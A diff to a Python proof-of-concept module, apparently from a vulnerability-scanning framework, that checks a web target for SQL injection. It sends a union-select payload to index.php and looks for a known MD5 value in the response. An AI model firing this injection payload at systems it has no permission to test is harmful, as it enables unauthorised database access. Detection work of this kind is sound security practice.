@@ -32,11 +32,10 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            arg = '{target}'.format(target=self.target)
-            url = arg
-            payload = ("/index.php/*123*/'union/**/select/**/1,2,3,4,5,6,7,8,md5(3.1415),10,11%23&action=getatlbyid")
+            url = '{target}'.format(target=self.target)
+            payload = "/index.php/*123*/'union/**/select/**/1,2,3,4,5,6,7,8,md5(3.1415),10,11%23&action=getatlbyid"
             target_url=url + payload
-            code, head, body, _, _ = hh.http('"%s"' % target_url)
+            code, head, body, _, _ = hh.http(target_url)
             if code == 200:
                 if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
